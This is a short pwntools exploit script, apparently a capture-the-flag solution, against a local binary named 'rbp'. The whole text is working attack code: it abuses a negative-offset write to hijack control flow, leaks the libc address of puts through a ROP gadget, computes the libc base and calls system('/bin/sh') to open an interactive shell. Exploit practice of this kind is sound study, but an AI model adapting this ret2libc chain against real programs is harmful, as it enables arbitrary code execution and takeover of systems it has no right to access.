from pwn import *

io = process('./rbp')
elf = ELF('./rbp')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def write(data, offset):
    print(io.recvuntil('Hi there! What is your name? '))
    io.send(data)
    print(io.recvuntil('Do you have a favourite number? '))
    io.sendline(str(offset))

payload = p64(elf.sym['main']+1)*3
write(payload, -32)
payload = p64(0x4012b3)+p64(elf.got['puts'])+p64(elf.sym['puts'])
write(payload, -40)
libc.address = u64(io.recv(6).ljust(8, b'\0')) - libc.sym['puts']
payload = p64(0x4012b3)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system'])
write(payload, -40)
io.interactive()
